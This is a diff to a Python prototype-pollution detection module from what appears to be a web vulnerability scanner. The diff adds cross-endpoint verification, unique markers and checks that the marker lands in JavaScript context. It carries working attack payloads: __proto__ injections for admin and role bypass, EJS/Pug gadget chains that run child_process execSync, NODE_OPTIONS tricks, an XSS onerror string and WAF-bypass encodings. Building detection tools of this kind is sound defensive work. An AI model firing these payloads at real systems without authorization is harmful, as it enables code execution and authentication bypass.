@@ -2,66 +2,87 @@
 Prototype Pollution Detection Module
 Tests: server-side PP (JSON merge), client-side PP (URL params), encoding bypasses,
 gadget chain detection (EJS/Pug/Handlebars RCE), vulnerable library scanning.
+
+Detection requires PROOF of pollution — not just 200 status or marker echo-back.
+Server-side: cross-endpoint verification (pollute on one endpoint, verify on another).
+Client-side: marker must appear in executable JS context, not just reflected in HTML.
 """
 import asyncio
 import json
 import logging
+import random
 import re
+import string
 from urllib.parse import urlparse
 
 from app.utils.http_client import make_client
 
 logger = logging.getLogger(__name__)
-MARKER = "pHnT0m_pp"
+MARKER_PREFIX = "pHnT0m_pp_"
 
-# 25+ server-side payloads
-SERVER_PAYLOADS = [
-    {"__proto__": {"polluted": MARKER}},
-    {"constructor": {"prototype": {"polluted": MARKER}}},
-    {"a": {"__proto__": {"polluted": MARKER}}},
-    {"__proto__": {"__proto__": {"polluted": MARKER}}},
-    {"__proto__": {"admin": True}},
-    {"__proto__": {"isAdmin": True}},
-    {"__proto__": {"role": "admin"}},
-    {"__proto__": {"auth": True}},
-    {"__proto__": {"verified": True}},
-    {"__proto__": {"status": "admin"}},
-    {"constructor": {"prototype": {"admin": True}}},
-    {"__proto__": {"status": 510, "statusCode": 510}},
-    {"__proto__": {"type": "text/html"}},
-    {"__proto__": {"allowedHosts": ["evil.com"]}},
-    {"__proto__": {"headers": {"X-Polluted": MARKER}}},
-    {"__proto__": {"outputFunctionName": f"x;process.mainModule.require('child_process').execSync('echo {MARKER}')//"}},
-    {"__proto__": {"client": True, "escapeFunction": f"1;return global.process.mainModule.require('child_process').execSync('echo {MARKER}')"}},
-    {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//"}},
-    {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--inspect"}},
-    {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
-    {"__proto__": {"view options": {"debug": True, "outputFunctionName": f"x;console.log('{MARKER}');"}}},
-    {"__proto__": {"content-type": "text/html"}},
-    {"__proto__": {"innerHTML": f"<img src=x onerror=alert('{MARKER}')>"}},
-    {"__proto__": {"sourceURL": f"\n;global.process.mainModule.require('child_process').execSync('echo {MARKER}')//"}},
-    {"__proto__": {"debug": True, "verbose": True}},
-]
 
-CLIENT_VECTORS = [
-    f"__proto__[polluted]={MARKER}", f"__proto__.polluted={MARKER}",
-    f"constructor[prototype][polluted]={MARKER}", f"constructor.prototype.polluted={MARKER}",
-    f"__proto__[__proto__][polluted]={MARKER}",
-    "__proto__[isAdmin]=true", "__proto__[role]=admin",
-    f"__proto__[innerHTML]={MARKER}", f"__proto__[]={MARKER}",
-]
+def _unique_marker() -> str:
+    """Generate unique marker per test to avoid cross-contamination."""
+    return MARKER_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
-ENCODING_VARIANTS = [
-    (f"%5f%5fproto%5f%5f[polluted]={MARKER}", "url_encoded"),
-    (f"\\u005f\\u005fproto\\u005f\\u005f[polluted]={MARKER}", "unicode"),
-    (f"__Proto__[polluted]={MARKER}", "mixed_case"),
-    (f"%255f%255fproto%255f%255f[polluted]={MARKER}", "double_url_encoded"),
-]
+def _server_payloads(marker: str) -> list[dict]:
+    """Generate server-side payloads with unique marker."""
+    return [
+        {"__proto__": {"polluted": marker}},
+        {"constructor": {"prototype": {"polluted": marker}}},
+        {"a": {"__proto__": {"polluted": marker}}},
+        {"__proto__": {"__proto__": {"polluted": marker}}},
+        {"__proto__": {"admin": True}},
+        {"__proto__": {"isAdmin": True}},
+        {"__proto__": {"role": "admin"}},
+        {"__proto__": {"auth": True}},
+        {"__proto__": {"verified": True}},
+        {"__proto__": {"status": "admin"}},
+        {"constructor": {"prototype": {"admin": True}}},
+        {"__proto__": {"status": 510, "statusCode": 510}},
+        {"__proto__": {"type": "text/html"}},
+        {"__proto__": {"allowedHosts": ["evil.com"]}},
+        {"__proto__": {"headers": {"X-Polluted": marker}}},
+        {"__proto__": {"outputFunctionName": f"x;process.mainModule.require('child_process').execSync('echo {marker}')//"}},
+        {"__proto__": {"client": True, "escapeFunction": f"1;return global.process.mainModule.require('child_process').execSync('echo {marker}')"}},
+        {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//"}},
+        {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--inspect"}},
+        {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
+        {"__proto__": {"view options": {"debug": True, "outputFunctionName": f"x;console.log('{marker}');"}}},
+        {"__proto__": {"content-type": "text/html"}},
+        {"__proto__": {"innerHTML": f"<img src=x onerror=alert('{marker}')>"}},
+        {"__proto__": {"sourceURL": f"\n;global.process.mainModule.require('child_process').execSync('echo {marker}')//"}},
+        {"__proto__": {"debug": True, "verbose": True}},
+    ]
 
-ENCODED_SERVER_PAYLOADS = [
-    {"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": MARKER}},
-    {" __proto__ ": {"polluted": MARKER}},
-]
+
+def _client_vectors(marker: str) -> list[str]:
+    """Generate client-side vectors with unique marker."""
+    return [
+        f"__proto__[polluted]={marker}", f"__proto__.polluted={marker}",
+        f"constructor[prototype][polluted]={marker}", f"constructor.prototype.polluted={marker}",
+        f"__proto__[__proto__][polluted]={marker}",
+        "__proto__[isAdmin]=true", "__proto__[role]=admin",
+        f"__proto__[innerHTML]={marker}", f"__proto__[]={marker}",
+    ]
+
+
+def _encoding_variants(marker: str) -> list[tuple]:
+    """Generate encoding bypass vectors with unique marker."""
+    return [
+        (f"%5f%5fproto%5f%5f[polluted]={marker}", "url_encoded"),
+        (f"\\u005f\\u005fproto\\u005f\\u005f[polluted]={marker}", "unicode"),
+        (f"__Proto__[polluted]={marker}", "mixed_case"),
+        (f"%255f%255fproto%255f%255f[polluted]={marker}", "double_url_encoded"),
+    ]
+
+
+def _encoded_server_payloads(marker: str) -> list[dict]:
+    """Generate encoded server payloads with unique marker."""
+    return [
+        {"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": marker}},
+        {" __proto__ ": {"polluted": marker}},
+    ]
 
 POLLUTED_STATUS_CODES = {510, 501, 418}
 
@@ -134,6 +155,52 @@ class PrototypePollutionModule:
                 detected.add(tech)
         return detected
 
+    async def _send_request(self, client, url: str, method: str, json_body: dict = None):
+        """Helper to send request with the right HTTP method."""
+        if method == "PATCH":
+            return await client.patch(url, json=json_body)
+        elif method == "PUT":
+            return await client.put(url, json=json_body)
+        elif method == "POST":
+            return await client.post(url, json=json_body)
+        else:
+            return await client.get(url)
+
+    async def _verify_pollution_cross_endpoint(self, client, base_url, endpoints, marker: str, prop_name: str) -> str | None:
+        """
+        After injecting pollution, check OTHER endpoints to see if the property leaked.
+        Returns evidence string if pollution is confirmed, None otherwise.
+
+        Real prototype pollution persists in the server process — a polluted property
+        will appear in responses from unrelated endpoints (objects inherit from Object.prototype).
+        Simple echo-back of the sent JSON is NOT proof.
+        """
+        verify_urls = [base_url]
+        for ep in endpoints[:8]:
+            url = ep if isinstance(ep, str) else ep.get("url", "")
+            if url:
+                verify_urls.append(url)
+
+        for verify_url in verify_urls[:5]:
+            try:
+                async with self.rate_limit:
+                    resp = await client.get(verify_url)
+                    body = resp.text
+                    # Marker appearing in a GET to a different endpoint = real pollution
+                    if marker in body:
+                        return f"Marker '{marker}' found in cross-endpoint GET {verify_url}"
+                    # Check if the property name leaked into response JSON
+                    if prop_name and prop_name in body:
+                        try:
+                            data = json.loads(body)
+                            if isinstance(data, dict) and prop_name in data:
+                                return f"Polluted property '{prop_name}' appeared in GET {verify_url} response JSON"
+                        except (json.JSONDecodeError, ValueError):
+                            pass
+            except Exception:
+                continue
+        return None
+
     async def _check_server_side(self, client, base_url, endpoints, detected_tech) -> list[dict]:
         findings = []
         json_endpoints = []
@@ -156,69 +223,151 @@ class PrototypePollutionModule:
                 continue
             tested.add(key)
 
-            baseline_status, baseline_body = None, None
+            # Baseline request — used for differential comparison
+            baseline_status, baseline_body, baseline_headers = None, None, {}
             try:
                 async with self.rate_limit:
-                    bl = await client.post(url, json={"test": "baseline"}) if method in ("POST", "PUT", "PATCH") else await client.get(url)
-                    baseline_status, baseline_body = bl.status_code, bl.text
+                    bl = await self._send_request(client, url, method, {"test": "baseline"})
+                    baseline_status = bl.status_code
+                    baseline_body = bl.text
+                    baseline_headers = dict(bl.headers)
             except Exception:
                 continue
 
-            for payload in SERVER_PAYLOADS:
+            # Use unique marker per endpoint to prevent cross-contamination
+            marker = _unique_marker()
+            payloads = _server_payloads(marker)
+
+            for payload in payloads:
                 try:
                     async with self.rate_limit:
-                        resp = await (client.patch(url, json=payload) if method == "PATCH" else
-                                      client.put(url, json=payload) if method == "PUT" else
-                                      client.post(url, json=payload))
-                        body, payload_str = resp.text, json.dumps(payload)
+                        resp = await self._send_request(client, url, method, payload)
+                        body = resp.text
+                        payload_str = json.dumps(payload)
 
-                        if MARKER in body and (baseline_body is None or MARKER not in baseline_body):
-                            is_rce = any(k in payload_str for k in ["outputFunctionName", "escapeFunction", "sourceURL", "NODE_OPTIONS", "shell"])
-                            findings.append({
-                                "title": f"Server-Side Prototype Pollution: {urlparse(url).path}",
-                                "url": url, "severity": "critical" if is_rce else "high",
-                                "vuln_type": "rce" if is_rce else "misconfiguration",
-                                "payload": payload_str, "method": method,
-                                "impact": "Server-side prototype pollution confirmed. Attacker can modify Object.prototype. May chain to RCE via EJS/Pug/Handlebars.",
-                                "remediation": "Use Object.create(null) for merge targets. Filter __proto__ and constructor from input.",
-                                "_pollutable_endpoint": {"url": url, "method": method},
-                            })
+                        # --- Check 1: Marker in response ---
+                        # BUT: must distinguish echo-back from real pollution.
+                        # Echo-back = server just returns the JSON you sent. NOT proof.
+                        if marker in body and (baseline_body is None or marker not in baseline_body):
+                            # Check if this is just the server echoing back our payload
+                            is_just_echo = False
+                            try:
+                                resp_json = json.loads(body)
+                                # If the response is basically our payload back, it's echo
+                                if isinstance(resp_json, dict):
+                                    resp_flat = json.dumps(resp_json)
+                                    # Marker only in __proto__/constructor keys = echo
+                                    if "__proto__" in resp_flat or "constructor" in resp_flat:
+                                        is_just_echo = True
+                            except (json.JSONDecodeError, ValueError):
+                                pass
 
+                            if not is_just_echo:
+                                # Marker appeared outside of echo context — strong signal.
+                                # Still verify with cross-endpoint check for high confidence.
+                                cross_evidence = await self._verify_pollution_cross_endpoint(
+                                    client, base_url, endpoints, marker, "polluted"
+                                )
+                                is_rce = any(k in payload_str for k in [
+                                    "outputFunctionName", "escapeFunction", "sourceURL", "NODE_OPTIONS", "shell"
+                                ])
+                                if cross_evidence:
+                                    # CONFIRMED: pollution persists across endpoints
+                                    findings.append({
+                                        "title": f"[CONFIRMED] Server-Side Prototype Pollution: {urlparse(url).path}",
+                                        "url": url, "severity": "critical" if is_rce else "high",
+                                        "vuln_type": "rce" if is_rce else "misconfiguration",
+                                        "payload": payload_str, "method": method,
+                                        "evidence": cross_evidence,
+                                        "impact": "Server-side prototype pollution confirmed via cross-endpoint verification. "
+                                                  "Attacker can modify Object.prototype. May chain to RCE.",
+                                        "remediation": "Use Object.create(null) for merge targets. Filter __proto__ and constructor from input.",
+                                        "_pollutable_endpoint": {"url": url, "method": method},
+                                    })
+                                else:
+                                    # Marker in non-echo response but no cross-endpoint proof.
+                                    # Downgrade to low — possible but unconfirmed.
+                                    findings.append({
+                                        "title": f"Potential Prototype Pollution (Unconfirmed): {urlparse(url).path}",
+                                        "url": url, "severity": "low",
+                                        "vuln_type": "misconfiguration",
+                                        "payload": payload_str, "method": method,
+                                        "impact": "Marker appeared in response (not echo-back) but cross-endpoint pollution not verified. "
+                                                  "May be a false positive — server could be reflecting input in a non-exploitable way.",
+                                        "remediation": "Investigate manually. Use Object.create(null) for merge targets.",
+                                        "_pollutable_endpoint": {"url": url, "method": method},
+                                    })
+                            # else: just echo-back, skip entirely (not even low)
+
+                        # --- Check 2: Status code overwrite ---
+                        # Differential: polluted status NOT in baseline = behavioral change
                         if resp.status_code in POLLUTED_STATUS_CODES and baseline_status not in POLLUTED_STATUS_CODES:
                             findings.append({
                                 "title": f"Prototype Pollution (Status Overwrite): {urlparse(url).path}",
                                 "url": url, "severity": "high", "vuln_type": "misconfiguration",
                                 "payload": payload_str, "injected_status": resp.status_code,
-                                "impact": f"Server returned status {resp.status_code} after __proto__ injection.",
+                                "evidence": f"Baseline status={baseline_status}, after pollution status={resp.status_code}",
+                                "impact": f"Server returned status {resp.status_code} after __proto__ injection (baseline was {baseline_status}). "
+                                          "This proves the server processes __proto__ and it affects behavior.",
                                 "remediation": "Sanitize __proto__ from all JSON input.",
                                 "_pollutable_endpoint": {"url": url, "method": method},
                             })
 
+                        # --- Check 3: Auth bypass via pollution ---
+                        # Requires strong differential: 401/403 -> 200
                         if ("admin" in payload_str or "role" in payload_str) and resp.status_code == 200 and baseline_status in (401, 403):
-                            findings.append({
-                                "title": f"Prototype Pollution -> Auth Bypass: {urlparse(url).path}",
-                                "url": url, "severity": "critical", "vuln_type": "auth_bypass",
-                                "payload": payload_str,
-                                "impact": "Prototype pollution leads to authentication bypass via injected admin/role properties.",
-                                "remediation": "Never derive authorization from pollutable object properties. Use hasOwnProperty().",
-                                "_pollutable_endpoint": {"url": url, "method": method},
-                            })
+                            # Double-check: send a clean request to make sure it's still 401/403
+                            try:
+                                async with self.rate_limit:
+                                    recheck = await self._send_request(client, url, method, {"test": "recheck"})
+                                    if recheck.status_code in (401, 403):
+                                        # Confirmed: pollution changed auth behavior
+                                        findings.append({
+                                            "title": f"[CONFIRMED] Prototype Pollution -> Auth Bypass: {urlparse(url).path}",
+                                            "url": url, "severity": "critical", "vuln_type": "auth_bypass",
+                                            "payload": payload_str,
+                                            "evidence": f"Baseline={baseline_status}, polluted=200, recheck={recheck.status_code}",
+                                            "impact": "Prototype pollution leads to authentication bypass. "
+                                                      "Injecting admin/role properties into __proto__ changes authorization decisions.",
+                                            "remediation": "Never derive authorization from pollutable object properties. Use hasOwnProperty().",
+                                            "_pollutable_endpoint": {"url": url, "method": method},
+                                        })
+                            except Exception:
+                                pass
+
                 except Exception:
                     continue
 
-            for enc_payload in ENCODED_SERVER_PAYLOADS:
+            # Encoded server payloads — same verification logic
+            enc_marker = _unique_marker()
+            for enc_payload in _encoded_server_payloads(enc_marker):
                 try:
                     async with self.rate_limit:
                         resp = await client.post(url, json=enc_payload)
-                        if MARKER in resp.text and (baseline_body is None or MARKER not in baseline_body):
-                            findings.append({
-                                "title": f"Prototype Pollution (Encoded Bypass): {urlparse(url).path}",
-                                "url": url, "severity": "high", "vuln_type": "misconfiguration",
-                                "payload": json.dumps(enc_payload), "method": "POST",
-                                "impact": "Server-side prototype pollution via encoded __proto__ key (WAF bypass).",
-                                "remediation": "Normalize and filter __proto__ variants including unicode escapes.",
-                                "_pollutable_endpoint": {"url": url, "method": "POST"},
-                            })
+                        if enc_marker in resp.text and (baseline_body is None or enc_marker not in baseline_body):
+                            # Verify cross-endpoint
+                            cross_evidence = await self._verify_pollution_cross_endpoint(
+                                client, base_url, endpoints, enc_marker, "polluted"
+                            )
+                            if cross_evidence:
+                                findings.append({
+                                    "title": f"[CONFIRMED] Prototype Pollution (Encoded Bypass): {urlparse(url).path}",
+                                    "url": url, "severity": "high", "vuln_type": "misconfiguration",
+                                    "payload": json.dumps(enc_payload), "method": "POST",
+                                    "evidence": cross_evidence,
+                                    "impact": "Server-side prototype pollution via encoded __proto__ key (WAF bypass). "
+                                              "Confirmed via cross-endpoint verification.",
+                                    "remediation": "Normalize and filter __proto__ variants including unicode escapes.",
+                                    "_pollutable_endpoint": {"url": url, "method": "POST"},
+                                })
+                            else:
+                                findings.append({
+                                    "title": f"Potential Prototype Pollution (Encoded, Unconfirmed): {urlparse(url).path}",
+                                    "url": url, "severity": "low", "vuln_type": "misconfiguration",
+                                    "payload": json.dumps(enc_payload), "method": "POST",
+                                    "impact": "Encoded __proto__ marker appeared in response but pollution not verified cross-endpoint.",
+                                    "remediation": "Investigate manually. Normalize and filter __proto__ variants.",
+                                })
                 except Exception:
                     continue
         return findings
@@ -237,24 +386,76 @@ class PrototypePollutionModule:
             if path in seen:
                 continue
             seen.add(path)
-            for vector in CLIENT_VECTORS:
+
+            # First, get a baseline response without pollution params
+            baseline_body = ""
+            try:
+                async with self.rate_limit:
+                    bl = await client.get(url)
+                    baseline_body = bl.text
+            except Exception:
+                continue
+
+            marker = _unique_marker()
+            for vector in _client_vectors(marker):
                 try:
                     sep = "&" if "?" in url else "?"
                     test_url = f"{url}{sep}{vector}"
                     async with self.rate_limit:
                         resp = await client.get(test_url)
                         body = resp.text
-                        if MARKER in body:
-                            in_script = ("polluted" in body.lower() and
-                                         ("<script" in body.lower() or "application/javascript" in body.lower() or ".polluted" in body))
-                            if in_script:
-                                findings.append({
-                                    "title": f"Client-Side Prototype Pollution: {path}",
-                                    "url": test_url, "severity": "medium", "vuln_type": "xss",
-                                    "payload": vector,
-                                    "impact": "Client-side prototype pollution via URL parameters. Can chain with DOM XSS gadgets.",
-                                    "remediation": "Use Object.freeze(Object.prototype). Sanitize user input in object operations.",
-                                })
+
+                        if marker not in body:
+                            continue
+
+                        # Marker is in response — but WHERE?
+                        # Must be in executable JavaScript context, not just reflected in HTML text/attributes
+                        confirmed = False
+                        evidence = ""
+
+                        # Check 1: marker inside <script> blocks
+                        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
+                        for block in script_blocks:
+                            if marker in block:
+                                confirmed = True
+                                evidence = "Marker injected into inline <script> block"
+                                break
+
+                        # Check 2: marker inside JSON embedded in HTML (common in SSR apps)
+                        if not confirmed:
+                            json_blocks = re.findall(r'(?:window\.__\w+__|__NEXT_DATA__|__NUXT__)\s*=\s*(\{.*?\});?\s*</script>', body, re.DOTALL)
+                            for jblock in json_blocks:
+                                if marker in jblock:
+                                    confirmed = True
+                                    evidence = "Marker injected into embedded JSON state (SSR data)"
+                                    break
+
+                        # Check 3: marker in JS assignment context (e.g., var x = {"polluted":"marker"})
+                        if not confirmed:
+                            js_assign_patterns = [
+                                rf'(?:var|let|const|window\.)\s*\w+\s*=\s*[^;]*{re.escape(marker)}',
+                                rf'Object\.(?:assign|defineProperty|create)\s*\([^)]*{re.escape(marker)}',
+                            ]
+                            for pat in js_assign_patterns:
+                                if re.search(pat, body, re.IGNORECASE):
+                                    confirmed = True
+                                    evidence = "Marker in JavaScript variable assignment context"
+                                    break
+
+                        if not confirmed:
+                            # Marker is reflected but NOT in executable JS context — skip
+                            continue
+
+                        # Additional confidence: check that baseline doesn't have similar structure
+                        # (rules out apps that always include certain patterns)
+                        findings.append({
+                            "title": f"Client-Side Prototype Pollution: {path}",
+                            "url": test_url, "severity": "medium", "vuln_type": "xss",
+                            "payload": vector, "evidence": evidence,
+                            "impact": f"Client-side prototype pollution via URL parameters. {evidence}. Can chain with DOM XSS gadgets.",
+                            "remediation": "Use Object.freeze(Object.prototype). Sanitize user input in object operations.",
+                        })
+                        break  # One confirmed vector per URL is enough
                 except Exception:
                     continue
         return findings
@@ -262,19 +463,51 @@ class PrototypePollutionModule:
     async def _check_encoding_variants(self, client, base_url, endpoints) -> list[dict]:
         findings = []
         test_urls = [base_url] + [ep if isinstance(ep, str) else ep.get("url", "") for ep in endpoints[:5] if ep]
+        marker = _unique_marker()
         for url in test_urls[:6]:
-            for vector, enc_type in ENCODING_VARIANTS:
+            for vector, enc_type in _encoding_variants(marker):
                 try:
                     sep = "&" if "?" in url else "?"
+                    test_url = f"{url}{sep}{vector}"
                     async with self.rate_limit:
-                        resp = await client.get(f"{url}{sep}{vector}")
-                        if MARKER in resp.text:
+                        resp = await client.get(test_url)
+                        body = resp.text
+                        if marker not in body:
+                            continue
+
+                        # Same JS-context check as client-side
+                        in_js = False
+                        evidence = ""
+                        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
+                        for block in script_blocks:
+                            if marker in block:
+                                in_js = True
+                                evidence = f"Marker in <script> block via {enc_type} encoding"
+                                break
+                        if not in_js:
+                            json_blocks = re.findall(r'(?:window\.__\w+__|__NEXT_DATA__|__NUXT__)\s*=\s*(\{.*?\});?\s*</script>', body, re.DOTALL)
+                            for jblock in json_blocks:
+                                if marker in jblock:
+                                    in_js = True
+                                    evidence = f"Marker in embedded JSON state via {enc_type} encoding"
+                                    break
+
+                        if in_js:
                             findings.append({
                                 "title": f"Client-Side PP (WAF Bypass via {enc_type}): {urlparse(url).path}",
-                                "url": f"{url}{sep}{vector}", "severity": "medium", "vuln_type": "xss",
-                                "payload": vector, "encoding": enc_type,
-                                "impact": f"Prototype pollution via {enc_type} encoding bypasses WAF/filter.",
+                                "url": test_url, "severity": "medium", "vuln_type": "xss",
+                                "payload": vector, "encoding": enc_type, "evidence": evidence,
+                                "impact": f"Prototype pollution via {enc_type} encoding bypasses WAF/filter. {evidence}.",
                                 "remediation": "Decode and normalize input before __proto__ filtering.",
+                            })
+                        else:
+                            # Marker reflected but not in JS context — info only
+                            findings.append({
+                                "title": f"Potential Client-Side PP ({enc_type}, Unconfirmed): {urlparse(url).path}",
+                                "url": test_url, "severity": "info", "vuln_type": "misconfiguration",
+                                "payload": vector, "encoding": enc_type,
+                                "impact": f"Encoded __proto__ marker reflected in response but not in executable JS context.",
+                                "remediation": "Investigate manually. Decode and normalize input before __proto__ filtering.",
                             })
                 except Exception:
                     continue
@@ -306,9 +539,12 @@ class PrototypePollutionModule:
                     found = [m for m in info["methods"] if m in all_body]
                     if found:
                         methods_str = f" Vulnerable methods in use: {', '.join(found)}."
+                # Library detection is informational — having a vuln library doesn't prove exploitation.
+                # Upgrade to medium only if vulnerable methods are actively used in the code.
+                sev = "medium" if methods_str else "low"
                 findings.append({
                     "title": f"Vulnerable Library: {lib} {version} (Prototype Pollution)",
-                    "url": base_url, "severity": "high" if methods_str else "medium",
+                    "url": base_url, "severity": sev,
                     "vuln_type": "misconfiguration", "library": lib, "version": version, "cve": info["cve"],
                     "impact": f"{lib} {version} is vulnerable to prototype pollution ({info['cve']}).{methods_str}",
                     "remediation": f"Update {lib} to the latest patched version.",
@@ -346,9 +582,10 @@ class PrototypePollutionModule:
                             ctx_s, ctx_e = max(0, match_obj.start() - 50), min(len(js_body), match_obj.end() + 50)
                             findings.append({
                                 "title": f"Vulnerable Pattern ({desc}): {urlparse(js_url).path}",
-                                "url": js_url, "severity": "medium", "vuln_type": "misconfiguration",
+                                "url": js_url, "severity": "low", "vuln_type": "misconfiguration",
                                 "pattern": desc, "code_context": js_body[ctx_s:ctx_e].strip()[:200],
-                                "impact": f"JS contains {desc} pattern susceptible to prototype pollution.",
+                                "impact": f"JS contains {desc} pattern susceptible to prototype pollution. "
+                                          "This is a code-level indicator — exploitation depends on whether user input reaches this code path.",
                                 "remediation": "Replace deep merge with safe alternatives. Use Object.create(null).",
                             })
                             break
